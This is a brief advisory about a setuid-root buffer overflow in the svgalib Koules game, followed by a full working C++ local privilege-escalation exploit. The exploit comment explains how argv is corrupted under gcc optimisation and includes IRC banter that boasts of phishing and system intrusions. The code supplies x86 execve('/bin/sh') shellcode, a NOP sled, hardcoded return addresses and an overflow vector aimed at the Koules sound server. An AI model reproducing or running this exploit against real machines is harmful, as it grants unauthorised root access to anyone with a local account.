source : http://www.securityfocus.com/bid/1967/info

Koules is an original, arcade-style game authored by Jan Hubicka. The version using svgalib is usually installed setuid root so that it may access video hardware when being run at the console by regular users. This version contains a buffer overflow vulnerability that may allow a user to gain higher priviledges. The vulnerability exists in handling of user-supplied commandline arguments.

Successful exploitation of this vulnerability leads to root compromise. Debian has announced they are not vulnerable to this problem.


/*
   Coolz.cpp - yep a C Plus Plus exploit, I like that Strings STL :)

   This problem has been known since April this year, but I have not
   seen any exploit so far.

   First of all I wasn't planning to go and release another ordinary stack
   smash, but I found the setuid game on some wargame/hackme I played on.
   Funny thing was that the exploitability proved to be a bit harder than I
   had anticipated at first.

   The problem can be found in the Koules1.4 package, code file:
      koules.sndsrv.linux.c - function: init()

   The `int i` disappears in the optimization gcc does. Since the strcat()
   function concatenates an array of filenames, `argv` gets ruined.
   This will cause the first run of the loop to fail.
   If argv point somewhere into adressable memory space, the chances of
   having a second pointer in there are close to zero, thus the second loop
   will fail.
   Last of all, if the argv[1] does point to a valid address the string
   contained there shouldn't be long enough to overwrite eip a second time,
   since that gets us into trouble. That's about it :)
   Even then, this ONLY works on machines that have compiled SVGALIB support
   in and NOT on the X windows version of 'koules'.

  Requested IRC quotes:
    <dagger02> ik heb jeuk aan me ballen.

    <marshal-> waar ben jij nu mee bezig man
    <sArGeAnt> nog een keer sukkel
    <sArGeAnt> en je ken es lekker kijken hoe packetjes je modem binnen komen

    <gmd-> sex ?

    <orangehaw> Scrippie HOU JE MOND OF Ik PACkEt Je ? ;)

    <silvio> chicks dig me when i place a bet, cause the mandelbrot sucks
             compare to the julia set

    <jimjones> 4 years ago there was no aol account i couldnt phish, now my
               unix virii grow faster than the petry dish

    <dugje>  I've seen nasa.gov navy.mil compaq.com and microsoft.com, there
             is only one goal left .. *.root-servers.net.

   Love goes out to: Hester and Maja
   Shouts go out to: Aad de Bruin, Karel Roos, L.G. Weert, Louis Maatman,
                     Richard Vriesde.
             --  We always did feel the same, we just saw it from a
                  different point of view...
                      [Bob Dylan - Tangled up in Blue]

<Scrippie> vraag me af wat ze zullen doen bij klpd als ze dat lezen (:
<dugje> ghehe ... je een plaatsje hoger zetten op de priority list ..

   -- Scrippie/ronald@grafix.nl
/*

/* Synnergy.net (c) 2000 */

#include <cstdio>
#include <string>
#include <cstdlib>
#include <unistd.h>

#define FILENAME "/usr/local/lib/koules/koules.sndsrv.linux"

#define NOP     'A'
#define NUMNOPS 500
#define RETADDY "\x90\xfe\xff\xbf"
/* Since we return in the cleared environment, we don't need to have a
   return address we can influence by command line "offset" arguments */

string heavenlycode =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char *addytostr(unsigned char *);

using namespace std;

main()
{
   string payload, vector;
   unsigned int i;
   const char *env[3];
   const char *ptr_to_bffffffc;

   /* Construction of our payload */
   payload.append(NUMNOPS, NOP);
   payload.append(heavenlycode);

   env[0] = payload.c_str();
   /* This memory address always contains 0x00000000 */
   env[1] = "\xfc\xff\xff\xbf";
   env[2] = NULL;

   /* Calculate for yourself, and check out: linux/fs/exec.c */
   ptr_to_bffffffc =
        addytostr((unsigned char *)(0xc0000000-sizeof(void *)-sizeof(FILENAME)
                                    -sizeof(heavenlycode)-sizeof(char *)-1));

   for(i=0;i<256;i++) {
      vector.append(RETADDY);           /* Fill the buffer */
   }
   /* We do NOT overwrite 'int i' - a register is used after gcc -O */
   vector.append(RETADDY);              /* Overwrites ebp */
   vector.append(RETADDY);              /* Overwrites eip */
   vector.append(ptr_to_bffffffc);      /* Overwrites argv argument */

   execle(FILENAME, "Segmentation fault (core dumped)", vector.c_str(), "A",
          NULL, env);

   perror("execle()");
}

char *addytostr(unsigned char *blaat)
{
   char *ret;

   if(!(ret = (char *)malloc(sizeof(unsigned char *)+1))) {
      perror("malloc()");
      exit(EXIT_FAILURE);
   }
   memcpy(ret, &blaat, sizeof(unsigned char *));
   ret[sizeof(unsigned char *)] = 0x00;

   return(ret);
}